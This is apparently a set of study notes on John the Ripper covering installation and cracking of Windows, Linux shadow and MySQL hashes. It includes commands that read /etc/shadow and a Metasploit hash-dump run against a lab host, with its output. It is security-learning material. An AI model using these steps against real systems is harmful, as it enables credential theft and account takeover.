=> Hash Cracker, has a lot of different distribution. Most popular distribution is "Jumbo John".

##Install

Per Repository:

```
sudo apt install john
```

Building from Source:

https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL

1.   Use `git clone https://github.com/openwall/john -b bleeding-jumbo john` to clone the jumbo john repository to your current working
2.   Then `cd john/src/` to change your current directory to where the source code is. 
3.  Once you're in this directory, use `./configure` to check the required dependencies and options that have been configured.
4.  If you're happy with this output, and have installed any required dependencies that are needed, use `make -s clean && make -sj4` to build a binary of john. This binary will be in the above run directory, which you can change to with `cd ../run`
5.  You can test this binary using ./john --test



# Basic Syntax

`john [options] [path to file]`

John has built-in features to detect what type of hash it's being given. (not always the best option)
To do this use:

`john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt`

To look for the password afterwards:

`john --show hash_to_crack.txt`

see #wordlists, #hash for more...

If the automated hash detection doesnt work you can use tools to identify the correct hash: [identify the type of the hash](hashing.md#hash%20identification)
and then use the `--format` option:

`john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt`

 If the hash is a standard type you have to use `raw-`, to check if your hash is a standard type use: `john --list=formats | grep -iF "md5"`

## Windows Passwords

[Windows Authentication](windows.md#authentication)

```
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
```

## Linux Passwords

[Linux - Password Storage](linux.md#password%20storage)

John can be very particular about the formats it needs data in to be able to work with it, for this reason- in order to crack `/etc/shadow` passwords, you must combine it with the `/etc/passwd`
file in order for John to understand the data it's being given. To do this, we use a tool built into the John suite of tools called unshadow. The basic syntax of unshadow is as follows:

`unshadow local_passwd local_shadow > unshadowed.txt`

After that start the crack:

`john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt`

When using unshadow, you can either use the entire /etc/passwd and /etc/shadow file- if you have them available, or you can use the relevant line from each. 

Example:
>>>>>>> 877ecb89fc418bec54c43a1c7980b3e6f25b2acd

```
cat /etc/passwd | grep root > rootpasswd.txt
cat /etc/shadow | grep root > rootshadow.txt
unshadow rootpasswd.txt rootshadow.txt > roothash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt roothash.txt
john --show roothash.txt
```


# Examples

Exploit MySQL with [MetaSploit](metasploit)

```
use auxiliary/scanner/mysql/mysql_hashdump 
options
set RHOSTS 10.10.60.123
set USERNAME root
set PASSWORD password
exploit
```

Output:

```
[+] 10.10.60.123:3306     - Saving HashString as Loot: root:
[+] 10.10.60.123:3306     - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.60.123:3306     - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.60.123:3306     - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.60.123:3306     - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.60.123:3306     - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
[*] 10.10.60.123:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

And Bruteforce:

```
echo carl:*EA031893AA21444B170FC2162A56978B8CEECE18 > hash.txt
john hash.txt
```

# FAQ

## No password hashes loaded (see FAQ)

Is coming up after using [unshadow](#Linux%20Passwords): If you view the output file and see **\$y\$** right after the username, then that indicates the passwords are hashed with **yescrypt**.

Then you should use `john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt roothash.txt` instead of `--foramt=sha512crypt`